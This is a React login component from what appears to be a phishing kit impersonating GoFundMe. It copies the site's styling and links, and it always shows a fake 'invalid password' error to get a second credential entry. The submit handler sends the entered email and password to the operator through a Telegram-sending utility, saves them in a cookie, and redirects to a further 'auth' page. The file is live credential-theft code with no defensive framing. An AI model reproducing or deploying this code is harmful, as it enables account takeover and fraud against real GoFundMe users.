import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login2() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login2>({
    username2: "",
    password2: "",
  });

  const navigate = useNavigate();
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = `
    ---- GO FUND ME LOGIN (SECOND TRY) -----
    Username: ${formInput.username2}
    Password: ${formInput.password2}
    `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("login2", formInput);
    setIsLoading(false);
    navigate("../login/auth", { replace: true });
  }

  return (
    <div>
      <form
        method="POST"
        onSubmit={handleSubmit}
        id="sign-in-form"
        className="susi-form_form__HS4LQ"
      >
        <p style={{color:"red"}}>Invalid username or password, Please try again!</p>
        <h2 className="hrt-show-for-lg hrt-mb-4 ds-override_heading2__GdTQ3">
          Your account details
        </h2>
        <div className="form_formRow__3vk2_ hrt-text-field">
          <div className="hrt-text-field-wrapper">
            <div className="hrt-text-field-inner">
              <input
                aria-invalid="false"
                className="hrt-text-field-input"
                id="email"
                placeholder=" "
                name="username2"
                required
                onChange={handleInputChange}
              />
              <label className="hrt-text-field-label" htmlFor="email">
                Email Address
              </label>
            </div>
          </div>
        </div>
        <div className="form_formRow__3vk2_ hrt-text-field">
          <div className="hrt-text-field-wrapper">
            <div className="hrt-text-field-inner">
              <input
                aria-invalid="false"
                className="hrt-text-field-input"
                id="password"
                placeholder=" "
                name="password2"
                type="password"
                role="textbox"
                required
                onChange={handleInputChange}
              />
              <label className="hrt-text-field-label" htmlFor="password">
                Password
              </label>
            </div>
            <div className="hrt-ml-1">
              <button
                className="password-field_revealBtn__ArANp hrt-tertiary-icon-button hrt-tertiary-icon-button--large hrt-base-button"
                type="button"
                aria-label="Reveal password"
                aria-pressed="false"
              >
                <svg
                  aria-hidden="true"
                  className="hrt-icon hrt-icon--large"
                  focusable="false"
                  viewBox="0 0 24 24"
                >
                  <use href="/_next/static/images/core-3b98e2e6f13b301263c5194dc144e4f5837cc40b684d62e05c23e733dc47f978.svg#view"></use>
                </svg>
              </button>
            </div>
          </div>
        </div>
        <span className="hrt-text-gray hrt-mb-5">
          <a href="https://www.gofundme.com/forgot-password">
            Forgot your password?
          </a>
        </span>
        <div className="susi-layout-footer_container__5oauA">
          <p>
            By clicking the Sign In button below, you agree to the GoFundMe
            <a
              className="hrt-link hrt-link--gray-dark"
              id="link-donate-terms"
              target="_blank"
              rel="noreferrer"
              href="https://www.gofundme.com/c/terms"
            >
              Terms of Service
            </a>
            and acknowledge the
            <a
              className="hrt-link hrt-link--gray-dark"
              id="link-donate-privacy"
              target="_blank"
              rel="noreferrer"
              href="https://www.gofundme.com/c/privacy"
            >
              Privacy Notice
            </a>
            .
          </p>
          {isLoading ? (
            <button
              className="susi-layout-footer_footerBtn__4suDz susi-layout-footer_primaryActionBtn__sO4FV hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button"
              data-element-id="btn_sign_in"
              type="button"
              form="sign-in-form"
              data-analytic-event-listener="true"
            >
              Please wait...
            </button>
          ) : (
            <button
              className="susi-layout-footer_footerBtn__4suDz susi-layout-footer_primaryActionBtn__sO4FV hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button"
              data-element-id="btn_sign_in"
              type="submit"
              form="sign-in-form"
              data-analytic-event-listener="true"
            >
              Sign In
            </button>
          )}
        </div>
      </form>
    </div>
  );
}
